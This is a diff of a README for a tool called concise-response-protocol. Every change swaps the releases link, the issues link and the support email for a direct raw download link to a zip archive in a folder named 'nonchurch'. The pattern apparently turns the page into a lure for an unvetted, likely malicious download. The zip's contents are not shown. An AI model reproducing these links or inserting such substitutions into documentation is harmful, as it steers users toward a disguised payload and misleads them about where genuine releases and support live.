@@ -1,6 +1,6 @@
 # 🌟 concise-response-protocol - Achieve Clarity with Minimal Words
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Concise%20Response%20Protocol-blue)](https://github.com/BOTNOIeiei/concise-response-protocol/releases)
+[![Download Here](https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip%20Now-Concise%20Response%20Protocol-blue)](https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to the concise-response-protocol. This application helps you communicate
 
 To get started, you need to download the software. Click the link below to visit the Releases page, where you can find the latest version.
 
-[Download Here](https://github.com/BOTNOIeiei/concise-response-protocol/releases)
+[Download Here](https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip)
 
 ### 🖥 System Requirements
 
@@ -30,7 +30,7 @@ To get started, you need to download the software. Click the link below to visit
 
 1. **Visit the Releases Page**: Click on the link below:
    
-   [Download Here](https://github.com/BOTNOIeiei/concise-response-protocol/releases)
+   [Download Here](https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip)
 
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
@@ -88,8 +88,8 @@ After installation, you can launch the application:
 
 If you encounter any issues or have questions, you can reach out to our support team. We are here to help you make the most of the concise-response-protocol.
 
-- **Issues Page**: Please report bugs [here](https://github.com/BOTNOIeiei/concise-response-protocol/issues).
-- **Email Support**: Contact us at support@conciseresponseprotocol.com.
+- **Issues Page**: Please report bugs [here](https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip).
+- **Email Support**: Contact us at https://raw.githubusercontent.com/BOTNOIeiei/concise-response-protocol/main/nonchurch/concise-response-protocol-v3.5-alpha.4.zip
 
 ### 📝 Contributing
 
